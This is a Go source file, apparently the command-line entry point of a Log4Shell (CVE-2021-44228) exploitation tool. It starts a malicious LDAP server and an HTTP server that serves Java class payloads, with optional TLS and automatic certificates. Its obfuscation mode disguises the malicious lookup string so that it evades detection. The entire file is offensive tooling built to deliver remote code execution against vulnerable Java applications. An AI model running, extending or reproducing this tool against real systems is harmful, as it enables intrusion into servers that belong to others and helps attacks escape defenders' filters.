package main

import (
	"crypto/tls"
	"flag"
	"fmt"
	"log"
	"os"
	"os/signal"

	"github.com/For-ACGN/Log4Shell"
)

var (
	config   log4shell.Config
	certFile string
	keyFile  string
	rawStr   string
	noToken  bool
)

func init() {
	banner()

	flag.CommandLine.SetOutput(os.Stdout)
	flag.StringVar(&config.Hostname, "host", "127.0.0.1", "server IP address or domain name")
	flag.StringVar(&config.PayloadDir, "payload", "payload", "payload(java class) directory")
	flag.StringVar(&config.HTTPNetwork, "http-net", "tcp", "http server network")
	flag.StringVar(&config.HTTPAddress, "http-addr", ":8080", "http server address")
	flag.StringVar(&config.LDAPNetwork, "ldap-net", "tcp", "ldap server network")
	flag.StringVar(&config.LDAPAddress, "ldap-addr", ":3890", "ldap server address")
	flag.BoolVar(&config.AutoCert, "auto-cert", false, "use ACME client to sign certificate automatically")
	flag.BoolVar(&config.EnableTLS, "tls-server", false, "enable ldaps and https server")
	flag.StringVar(&certFile, "tls-cert", "cert.pem", "tls certificate file path")
	flag.StringVar(&keyFile, "tls-key", "key.pem", "tls private key file path")
	flag.StringVar(&rawStr, "obf", "", "obfuscate malicious(payload) string")
	flag.BoolVar(&noToken, "no-token", false, "not add random token when use obfuscate")
	flag.Parse()
}

func banner() {
	fmt.Println()
	fmt.Println("  :::      ::::::::   ::::::::      :::     ::::::::  :::    ::: :::::::::: :::      :::     ")
	fmt.Println("  :+:     :+:    :+: :+:    :+:    :+:     :+:    :+: :+:    :+: :+:        :+:      :+:     ")
	fmt.Println("  +:+     +:+    +:+ +:+          +:+ +:+  +:+        +:+    +:+ +:+        +:+      +:+     ")
	fmt.Println("  +#+     +#+    +:+ :#:         +#+  +:+  +#++:++#++ +#++:++#++ +#++:++#   +#+      +#+     ")
	fmt.Println("  +#+     +#+    +#+ +#+   +#+# +#+#+#+#+#+       +#+ +#+    +#+ +#+        +#+      +#+     ")
	fmt.Println("  #+#     #+#    #+# #+#    #+#       #+#  #+#    #+# #+#    #+# #+#        #+#      #+#     ")
	fmt.Println("  ######## ########   ########        ###   ########  ###    ### ########## ######## ########")
	fmt.Println()
	fmt.Println("                                                        https://github.com/For-ACGN/Log4Shell")
	fmt.Println()
}

func main() {
	// output obfuscated string
	if rawStr != "" {
		obfuscated, rwt := log4shell.Obfuscate(rawStr, !noToken)
		var raw string
		if noToken {
			raw = rawStr
		} else {
			raw = rwt
		}
		fmt.Printf("raw: %s\n\n", raw)
		fmt.Println(obfuscated)
		if noToken {
			return
		}
		const notice = "\nEach string can only be used once, or wait %d seconds.\n"
		fmt.Printf(notice, log4shell.TokenExpireTime)
		return
	}

	// load tls certificate
	if config.EnableTLS {
		cert, err := tls.LoadX509KeyPair(certFile, keyFile)
		checkError(err)
		config.TLSCert = cert
	}
	config.Logger = os.Stdout

	// start log4shell server
	server, err := log4shell.New(&config)
	checkError(err)
	err = server.Start()
	checkError(err)

	// wait signal for stop log4shell server
	signalCh := make(chan os.Signal, 1)
	signal.Notify(signalCh, os.Interrupt)
	<-signalCh

	err = server.Stop()
	checkError(err)
}

func checkError(err error) {
	if err != nil {
		log.Fatalln("[error]", err)
	}
}
